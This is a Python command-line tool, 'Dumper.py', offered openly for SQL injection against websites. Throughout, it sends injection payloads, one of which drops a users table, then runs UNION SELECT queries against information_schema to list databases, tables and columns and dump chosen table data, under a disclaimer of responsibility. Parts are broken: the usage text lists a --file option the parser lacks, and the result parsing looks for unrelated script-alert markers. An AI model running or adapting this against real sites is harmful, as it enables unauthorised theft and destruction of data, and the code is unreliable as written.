import requests
import argparse
import os
import sys
import time

os.system('clear')
class bcolors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'

                 
banner = {'''  
          
          #Author  : D4RKD3MON
          #Contact : t.me/D4RKD3MON
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]   
          ________                                            
          \______ \  __ __  _____ ______   ___________  ______
           |    |  \|  |  \/     \\____ \_/ __ \_  __ \/  ___/
           |    `   \  |  /  Y Y  \  |_> >  ___/|  | \/\___ \ 
           /_______  /____/|__|_|  /   __/ \___  >__|  /____  >
                   \/            \/|__|        \/           \/ 
          
        Usage:
              .................................................................................
               python Dumper.py https://(link.com)/news.php?id=1                              .
               python Dumper.py -u https://(link.com)/news.php?id=1                           .
               python Dumper.py -u https://(link.com)/news.php?id=1 --file payload_list.txt   .
               python Dumper.py https://(link.com)/news.php?id=1 --file payload_list.txt      .
              .................................................................................
    '''
}

for col in banner:
    print(bcolors.GREEN + col, end="")
    sys.stdout.flush()
    time.sleep(0.00005)
  
SQL_PAYLOADS = [
    "' OR '1'='1",  
    "' UNION SELECT NULL, NULL -- ",  
    "' AND 1=1 -- ",  
    "'; DROP TABLE users -- ",  
    "' OR 'a'='a",  
]

class bcolors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'

def test_sql_injection(url, payloads):
    print(bcolors.GREEN + f"[*] SQL Injection Testing on {url}...\n")
    
    for payload in payloads:
        print(bcolors.YELLOW + f"[+] Sending the payload: {payload}")
        response = requests.get(url + payload)
        
        if "error" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
            print(bcolors.RED + f"[!] SQL Injection detected with the payload: {payload}")
            return True
    return False

def get_database_name(url):
    payload = "' UNION SELECT 1, database() -- "
    try:
        response = requests.get(url + payload)
        
        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Database extraction successful.")
            if 'database()' in response.text:
                start_index = response.text.find('database()') + len('database()') + 2  
                end_index = response.text.find('<', start_index)  
                db_name = response.text[start_index:end_index].strip()
                return db_name
    except Exception as e:
        print(bcolors.RED + f"[!] Error during database extraction: {e}")
    return None


def get_tables(url, db_name):
    payload = f"' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = '{db_name}' -- "
    try:
        response = requests.get(url + payload)

        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Table extraction successful.")

            start_index = response.text.find('<script>alert("')  # Ajuster cette partie en fonction du site
            if start_index != -1:
                tables = response.text[start_index:].split('</script>')[0]  
                return tables.split(",")  
    except Exception as e:
        print(bcolors.RED + f"[!] Error during table extraction: {e}")
    return None


def get_columns(url, db_name, table_name):
    payload = f"' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name = '{table_name}' AND table_schema = '{db_name}' -- "
    try:
        response = requests.get(url + payload)

        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Column extraction successful.")

            start_index = response.text.find('<script>alert("')  
            if start_index != -1:
                columns = response.text[start_index:].split('</script>')[0]  
                return columns.split(",")  
    except Exception as e:
        print(bcolors.RED + f"[!] Error during column extraction: {e}")
    return None

def dump_table_data(url, db_name, table_name, columns):

    columns_str = ','.join(columns)
    payload = f"' UNION SELECT {columns_str} FROM {table_name} -- "
    
    try:
        response = requests.get(url + payload)
        
        if "error" not in response.text.lower() and "mysql" not in response.text.lower():
            print(bcolors.GREEN + "[+] Table data dump successful.")

            start_index = response.text.find('<script>alert("')  # Ajuster selon le site cible
            if start_index != -1:
                data = response.text[start_index:].split('</script>')[0]  
                return data.split(",") 
                
    except Exception as e:
        print(bcolors.RED + f"[!] Error during data dump: {e}")
    return None

def main(target_url):
    print(bcolors.GREEN + f"\n[*] Starting SQL injection test on {target_url}\n")
    
    if test_sql_injection(target_url, SQL_PAYLOADS):
        print(bcolors.RED + "[!] The site appears to be vulnerable to SQL injection.")
        
        db_name = get_database_name(target_url)
        if db_name:
            print(bcolors.GREEN + f"[+] Database name: {db_name}")
            
            tables = get_tables(target_url, db_name)
            if tables:
                print(bcolors.GREEN + "[+] Tables in the database:")
                for i, table in enumerate(tables, 1):
                    print(f" {i}. {table}")
                
                table_choice = int(input("Choose a table to list the columns: ").strip()) - 1
                table_to_check = tables[table_choice]
                columns = get_columns(target_url, db_name, table_to_check)
                
                if columns:
                    print(bcolors.GREEN + f"[+] Columns in the table {table_to_check}:")
                    for i, column in enumerate(columns, 1):
                        print(f" {i}. {column}")
                    
                    column_choice = input("Choose the columns to dump (e.g., 1,2,3 for all columns): ").strip()
                    chosen_columns = [columns[int(i)-1] for i in column_choice.split(',')]
                    
                    data = dump_table_data(target_url, db_name, table_to_check, chosen_columns)
                    if data:
                        print(bcolors.GREEN + f"[+] Dumping the data:")
                        for row in data:
                            print(row)
        else:
            print(bcolors.RED + "[!] Unable to extract the database name.")
    else:
        print(bcolors.GREEN + "[+] No vulnerability detected.")

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="SQL Injection tool to extract databases.")
    parser.add_argument("url", help="L'URL to test (ex: http://example.com?id=1)")
    
    args = parser.parse_args()
    
    if args.url:
        main(args.url)
    else:
        print(bcolors.RED + "Error: L'Target URL is required.")
